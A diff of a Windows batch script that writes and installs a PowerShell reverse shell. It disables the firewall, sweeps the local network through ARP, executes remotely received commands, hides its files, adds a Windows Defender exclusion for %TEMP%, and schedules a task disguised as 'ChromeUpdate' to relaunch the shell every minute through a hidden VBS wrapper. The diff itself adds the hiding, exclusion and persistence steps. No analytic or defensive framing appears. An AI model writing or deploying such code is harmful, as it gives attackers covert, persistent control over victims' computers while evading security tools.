@@ -21,7 +21,6 @@ netsh advfirewall set allprofiles state off >nul 2>&1
 set "taskname=ChromeUpdate"
 set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;"
 set "file=revsh.ps1"
-set "wrapper=launch.vbs"
 
 echo if (netstat -an ^| select-string ":42069") { exit } > %file%
 echo $addrs = @(arp -a ^| select-string dynamic ^| foreach-object { ($_.line.trim() -split " ")[0] }); >> %file%
@@ -34,13 +33,18 @@ echo try { $sendback = (iex $data 2^>^&1 ^| Out-String ) + 'PS ' + (pwd).Path + 
 echo $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); } >> %file%
 echo $client.Close(); } catch {} } >> %file%
 
-attrib +h +s +r %file% >nul 2>&1
-powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\"" > nul 2>&1
+:: vbs wrapper run in hidden mode
+set "wrapper=launch.vbs"
 
-:: use vbs wrapper to run in hidden mode
 echo Set WshShell = CreateObject("WScript.Shell") > %wrapper%
 echo WshShell.Run "powershell -ExecutionPolicy Bypass -File ""%TEMP%\%file%""", 0, False >> %wrapper%
 
+:: hide files and whitelist directory
+attrib +h +s +r %file% >nul 2>&1
+attrib +h +s +r %wrapper% >nul 2>&1
+powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\"" > nul 2>&1
+
+:: schedule reverse shell to run every minute
 schtasks /create /tn "%taskname%" /tr "wscript.exe \"%TEMP%\launch.vbs\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul
 powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul
 
